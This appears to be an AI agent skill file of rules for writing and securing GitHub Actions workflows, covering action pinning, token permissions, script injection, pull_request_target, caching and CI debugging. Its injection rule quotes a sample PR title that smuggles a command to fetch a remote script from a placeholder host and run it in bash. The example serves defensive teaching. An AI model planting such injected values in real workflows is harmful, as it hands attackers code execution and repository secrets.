---
name: github-actions
description: Use when authoring, reviewing, debugging, or hardening GitHub Actions workflows - writing or editing .github/workflows/*.yml, fixing failing CI, pinning actions, setting token permissions, preventing script injection, optimizing caching/matrix/concurrency, or testing workflows locally
when_to_use: Trigger on any creation or edit of .github/workflows/*.yml or .github/actions/*/action.yml; any "CI is failing/flaky/stuck" report; any request about GITHUB_TOKEN permissions, secrets, pull_request_target, OIDC, caching, matrix, reusable workflows, or composite actions; any review of a workflow for security or correctness.
paths: ".github/workflows/**/*.yml,.github/workflows/**/*.yaml,.github/actions/**/action.yml,.github/actions/**/action.yaml"
---

# GitHub Actions

Authoring and hardening reference for GitHub Actions workflows. The body below
is the **standing rule set** you apply whenever you touch a workflow. Deep
lookup tables (versions, runners, expressions, full syntax) live in
`REFERENCE.md` -- consult it, do not memorize it.

## How to use this skill

1. Writing or editing a workflow -> apply the **Authoring Rules** below as you write.
2. Before declaring a workflow done -> run the **Definition of Done** checklist.
3. Need a version, runner label, or function signature -> read `REFERENCE.md`.
4. Debugging a failure -> jump to **Failure Triage**.

This is a **rigid skill for the security rules** (pinning, permissions,
injection, `pull_request_target`) and a **flexible reference** for everything
else. The four security rules have no exceptions without an explicit, written
reason.

## Authoring Rules

These are the mistakes agents and developers make most. Each is WRONG -> RIGHT.

### 1. Pin third-party actions to a full commit SHA (security, no exceptions)

Tags are mutable. A compromised upstream can move `@v4` to a malicious commit
and it lands in your pipeline silently (the March 2025 `tj-actions/changed-files`
compromise exfiltrated secrets across thousands of repos exactly this way). A
full 40-char SHA is the only immutable reference.

```yaml
# WRONG
- uses: tj-actions/changed-files@v44
# RIGHT -- SHA pin, human-readable version in a comment for Dependabot/Renovate
- uses: tj-actions/changed-files@a29e8b565651ce417abb5db7164b4a... # v44.5.7
```

First-party `actions/*` (checkout, setup-node, cache) are lower risk -- pinning
to the major tag (`@v6`) is acceptable for those. Verify any SHA belongs to the
real upstream repo, not a fork. Current major versions are in `REFERENCE.md`.

### 2. Set least-privilege `permissions` at the top of every workflow (security)

A missing `permissions:` block inherits a token whose scope depends on
repo/org settings -- often broad. A script injection or compromised action then
wields a write-capable token. The moment you specify _any_ permission, every
unspecified scope becomes `none` -- that narrowing is the goal.

```yaml
# RIGHT -- deny at top, widen per job only where needed
permissions:
  contents: read

jobs:
  release:
    permissions:
      contents: write   # only this job can push tags/releases
      id-token: write   # for OIDC
```

Use `permissions: {}` for jobs that need nothing. Full scope list in `REFERENCE.md`.

### 3. Never interpolate untrusted `${{ }}` into a `run:` block (security)

`${{ github.event.pull_request.title }}` (and `.body`, `.head.ref`,
`.comment.body`, `.issue.title`, commit messages, branch names, author
email/name) is substituted as raw text **before** the shell runs. A title of
`"; curl evil.sh | bash; #` becomes part of your script. This is the #1 GHA RCE
class.

```yaml
# WRONG
- run: echo "Title: ${{ github.event.pull_request.title }}"
# RIGHT -- bind to an env var (held in memory, never spliced into the script)
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"   # quoted shell var
```

Full list of untrusted contexts in `REFERENCE.md`.

### 4. `pull_request_target` must never check out + execute PR head (security)

`pull_request_target` runs in the **base repo** context with a read/write token
and full secret access, even for public forks. Checking out the fork's head and
running its code (install scripts, tests, build) hands your secrets to anyone
who opens a PR.

- Untrusted-code CI (build/test of fork code) -> use `on: pull_request`. Fork
  PRs get **no secrets** and a read-only token by design.
- Use `pull_request_target` only for trusted metadata ops (labeling,
  commenting) and never check out + run PR head.
- Need a secret-bearing step for fork PRs? Split it: untrusted build on
  `pull_request` uploads an artifact; a separate privileged `workflow_run` job
  downloads it. Treat the artifact as untrusted data. Pattern in `REFERENCE.md`.

### 5. Outputs and env via the files, never the deprecated commands

`::set-output::`, `::save-state::`, `set-env`, `add-path` are disabled. Steps
relying on them silently get empty values (a silent failure -- downstream
`steps.x.outputs.foo` is just empty).

```bash
echo "foo=bar" >> "$GITHUB_OUTPUT"        # producing step needs an id:
echo "FOO=bar" >> "$GITHUB_ENV"           # visible to LATER steps, not this one
echo "$HOME/bin" >> "$GITHUB_PATH"
```

Multiline values need a heredoc delimiter (a bare `=` corrupts the parser):

```bash
{
  echo "body<<DELIM"
  cat changelog.md
  echo "DELIM"
} >> "$GITHUB_OUTPUT"
```

### 6. Set `timeout-minutes` on every job

Default job timeout is **360 minutes (6h)**. A hung test burns 6h of runner
minutes and holds concurrency. Set a realistic budget (`timeout-minutes: 15`).

### 7. Add a `concurrency` group

No concurrency control means rapid pushes spawn redundant runs, and two deploys
to one environment can race. Cancel for CI; serialize (never cancel) for deploy.

```yaml
# CI
concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
# Deploy -- never cancel a half-done deploy
concurrency:
  group: deploy-production
  cancel-in-progress: false
```

### 8. Matrix: set `fail-fast: false` when you want full signal

`fail-fast` defaults to **true** -- the first failing leg cancels all siblings,
so you lose the answer to "does it fail on all versions or just 3.9?". Keep
`true` only for deploy/fan-out where one failure should abort everything.

### 9. Cache key must hash the lockfile

A static key (`${{ runner.os }}-node`) is immutable once populated -> a
dependency bump keeps restoring stale deps. Hash the lockfile and provide
`restore-keys` for a warm fallback. Prefer the `setup-*` built-in `cache:`,
which keys correctly for you.

```yaml
key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
restore-keys: |
  ${{ runner.os }}-node-
```

### 10. Be explicit about the shell when pipe failures matter

The **default** `run:` shell on Linux/macOS is `bash -e {0}` -- `-e` is on but
**`pipefail` is NOT**, so `false | tee log` succeeds silently. Setting
`shell: bash` explicitly gives you `bash --noprofile --norc -eo pipefail {0}`.

```yaml
defaults:
  run:
    shell: bash        # gets -eo pipefail
# or per step:
- run: |
    set -euo pipefail
    a | b | c
```

### 11. `if:` compares strings -- a bare non-empty string is always truthy

Outputs are always strings. `if: ${{ steps.x.outputs.flag }}` runs whenever the
value is non-empty (even `"false"`). Compare explicitly.

```yaml
# WRONG -- always runs
- if: ${{ steps.x.outputs.flag }}
# RIGHT
- if: steps.x.outputs.flag == 'true'
```

Also: any `if:` other than the implicit success default disables the implicit
`success()`, so use `if: always() && X` or `if: failure() && X` deliberately.
`continue-on-error: true` lets a step fail without failing the run;
`if: always()` makes a step run despite an earlier failure -- different tools.

### 12. Required checks must not sit behind a `paths:` filter

A required check gated by `on: pull_request: paths: ['src/**']` never reports on
a docs-only PR -> branch protection waits forever -> PR stuck. Run the job
unconditionally and filter _inside_ it (e.g. `dorny/paths-filter`), or use a
companion skip-workflow with the same job name. Pattern in `REFERENCE.md`.

## Definition of Done

Before claiming a workflow is complete, every line must hold:

1. `permissions:` set at top (least privilege); widened per-job only as needed.
2. Every third-party `uses:` pinned to a full SHA (+ version comment).
3. No untrusted `${{ github.event.* }}` inside any `run:`; routed via `env:`.
4. `pull_request_target` (if used) never checks out + executes PR head.
5. `timeout-minutes` on every job.
6. `concurrency` group set (cancel for CI, serialize for deploy).
7. Matrix `fail-fast: false` where you want full signal.
8. Cache keys include `hashFiles(lockfile)` + `restore-keys`.
9. Outputs/env via `$GITHUB_OUTPUT`/`$GITHUB_ENV` (heredoc for multiline).
10. `shell: bash` or `set -euo pipefail` where pipe failures matter.
11. Boolean `if:` compares to `'true'`; no string-truthiness reliance.
12. Action runtimes on `node20`+ (no `node12`/`node16`).
13. Current action versions (check `REFERENCE.md`, do not ship stale `@v3`).

Then validate. Run **both** linters -- they are complementary, not redundant:
`actionlint` catches syntax and correctness mistakes; `zizmor` is a security
static-analysis pass that catches the rules above (template injection into
`run:`, overbroad `permissions:`, dangerous `pull_request_target` checkout,
unpinned actions, credential persistence) plus more.

```bash
actionlint .github/workflows/*.{yml,yaml}   # syntax + common correctness mistakes
zizmor .github/workflows/ .github/actions/  # security audit (template injection, perms, triggers)
act -n                               # dry-run locally (lists jobs)
act push                             # simulate a push event
gh workflow view <name>              # confirm GitHub parses it
```

If the repo has composite/local actions under `.github/actions/`, audit them
too -- the same security rules (pinning, untrusted `${{ }}` in `run:`,
credential persistence) apply to an `action.yml`. `zizmor` recurses into every
directory you pass it, so the command above (which includes `.github/actions/`)
already covers them. `actionlint` does **not**: it validates the _workflow_
schema, not the action-metadata schema (`runs:`, `using: composite`, `inputs:`),
so pointing it at an `action.yml` only shellchecks the `run:` blocks. Rely on
`zizmor` for the security audit of action definitions.

Some `zizmor` audits (e.g. resolving action SHAs, known-vuln checks) hit the
GitHub API and run only when a token is present -- export `GH_TOKEN` to enable
them, or pass `--offline` to force purely offline auditing and skip them. Treat
its findings the same as the security rules above: fix, or record an explicit
written reason (zizmor supports `# zizmor: ignore[rule]` inline suppressions
when a finding is a deliberate, justified exception).

## Failure Triage

| Symptom | Likely cause | Fix |
| --- | --- | --- |
| PR stuck "Waiting for status" | Required check behind `paths:` filter | Run job unconditionally, filter inside (rule 12) |
| `steps.x.outputs.foo` empty | Deprecated `::set-output::`, or step missing `id:` | Use `$GITHUB_OUTPUT`; add `id:` (rule 5) |
| Secret empty on a fork PR | `pull_request` from fork gets no secrets by design | Split build/privileged via `workflow_run` (rule 4) |
| `Resource not accessible by integration` | Token missing a scope | Grant the scope in `permissions:` (rule 2) |
| Pipeline failure not failing the job | Default shell has no `pipefail` | `shell: bash` or `set -o pipefail` (rule 10) |
| Step always runs despite `if:` | String truthiness / lost `success()` | Compare to `'true'`; use `failure()`/`always()` (rule 11) |
| Cache never invalidates / never hits | Static key, or over-unique key with `github.sha` | Hash the lockfile + `restore-keys` (rule 9) |
| One matrix failure killed the rest | `fail-fast` defaults true | `fail-fast: false` (rule 8) |
| `node16`/`node12` deprecation warning | Old action runtime | Bump the action to a `node20`+ version (rule 1) |
| Env set in one step missing in same step | `$GITHUB_ENV` applies to LATER steps only | Use a shell var within the step (rule 5) |
| Artifact upload errors in a matrix | v4 artifacts need unique names per job | `name: build-${{ matrix.os }}` (REFERENCE) |

**Read logs fully**: `gh run view <id> --log-failed` for the failing step, not
just the summary. Enable `ACTIONS_STEP_DEBUG=true` (repo variable) for verbose
step logs.

## Local testing and monitoring

```bash
# act -- run workflows locally (https://github.com/nektos/act)
act                  # defaults to push event
act pull_request     # specific event
act -j build         # specific job
act -n               # dry-run (list jobs)
act -s GITHUB_TOKEN=$GITHUB_TOKEN   # provide a secret

# gh CLI -- monitor real runs
gh run watch                 # block until current run completes
gh run view <id> --log-failed   # logs of failed steps only
gh run list --limit 10
gh run rerun <id> --failed
gh pr checks --watch
```

## Related skills

- `lint-workflow` -- run `actionlint` (+ `zizmor` for security) after editing a workflow.
- `verification-before-completion` -- test locally with `act` before done.
- `github-agentic-workflows` -- for AI-agent-driven workflows specifically.

See `REFERENCE.md` for: current action versions, runner labels, the full
permissions scope list, untrusted-context list, the fork-safe two-workflow
pattern, reusable workflows vs composite actions, dynamic matrix, expressions
and functions, OIDC, artifact attestations, and complete workflow templates.
